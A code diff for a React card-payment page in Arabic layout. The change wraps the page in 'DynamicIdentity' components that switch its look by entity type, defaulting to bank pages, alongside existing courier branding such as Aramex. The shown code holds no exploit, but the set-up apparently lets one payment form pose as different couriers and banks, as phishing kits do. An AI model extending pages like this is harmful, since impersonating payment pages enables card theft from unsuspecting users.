@@ -11,6 +11,8 @@ import { Shield, CreditCard, Lock, AlertCircle } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import BackButton from "@/components/BackButton";
+import { DynamicIdentity, EntityHeader, EntityContainer, EntityButton } from "@/components/DynamicIdentity";
+import { getPaymentEntityType } from "@/lib/paymentEntityHelper";
 
 const PaymentCard = () => {
   const { id, paymentId } = useParams();
@@ -30,6 +32,9 @@ const PaymentCard = () => {
   const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
   const serviceName = link?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  
+  // Determine entity type
+  const entityType = link ? getPaymentEntityType(link) : 'bank_pages';
   
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "");
@@ -98,6 +103,8 @@ const PaymentCard = () => {
   };
   
   return (
+    <DynamicIdentity entityType={entityType}>
+      <EntityContainer entityType={entityType} useBackgroundImage={false}>
     <div 
       className="min-h-screen py-4 sm:py-12" 
       dir="rtl"
@@ -335,6 +342,8 @@ const PaymentCard = () => {
         </div>
       </div>
     </div>
+      </EntityContainer>
+    </DynamicIdentity>
   );
 };
 
